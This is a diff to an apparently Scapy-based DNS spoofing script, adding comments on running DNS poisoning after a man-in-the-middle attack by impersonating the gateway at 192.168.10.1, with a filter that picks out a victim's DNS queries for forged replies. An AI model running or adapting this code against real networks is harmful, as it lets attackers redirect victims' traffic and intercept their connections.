@@ -16,6 +16,13 @@ import ipaddress
 # Employ the MitM to improve the timing reliability. Also as an extra add can be
 # to have your machine be used as a Gateway by allowing IP forwarding
 
+# Recommended to start DNS poison after you have set up a MitM attack,
+# In testing now I spoof as local gateway at 192.168.10.1 since standard
+# configuration often are to send DNS queries against the nameserver there from ISP
+
+# Extra disclaimer, running poison on udp 53 makes your machine own
+# DNS queries a bit sluggish since we sniff on the port and send packages
+
 ATTACKER_IP=""
 VICTIM_IP=""
 SPOOF_DOMAIN=""  ## Global holder to set the target domain to redirect resolv from
@@ -30,7 +37,7 @@ def is_valid_ip(target):
 
 def process_packet(packet):
   # This condition could be changed to allow all but our machine's IP if we want to poison more
-  # Safeguard the poison for our own machine
+  # Safeguard the poison for our own machine - possibly redundant to check ATTACKER_IP but better to be safe
   if packet[IP].src == VICTIM_IP and packet[IP].src != ATTACKER_IP:
   # Check if the packet is a DNS query
     if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
